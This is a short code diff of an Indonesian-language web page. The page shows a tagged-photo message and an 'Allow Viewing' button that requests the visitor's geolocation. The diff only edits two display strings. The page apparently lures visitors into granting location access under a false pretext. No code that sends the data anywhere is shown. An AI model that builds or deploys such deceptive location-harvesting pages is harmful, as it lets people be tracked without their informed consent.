@@ -32,7 +32,7 @@
   <body>
     <h2>Menunggu Untuk Melihat</h2>
     <button onclick="getLocation()">Izinkan Melihat</button>
-    <p id="status">Fhoto Anda Di Tandai</p>
+    <p id="status">Fhoto Anda Di </p>
 
     <script>
       function getLocation() {
@@ -69,7 +69,7 @@
       function showError(error) {
         switch(error.code) {
           case error.PERMISSION_DENIED:
-            document.getElementById("status").innerText = "❌ Anda menolak untuk melihat.";
+            document.getElementById("status").innerText = "❌ Anda menolak izin lokasi.";
             break;
           case error.POSITION_UNAVAILABLE:
             document.getElementById("status").innerText = "❌ Lokasi tidak tersedia.";
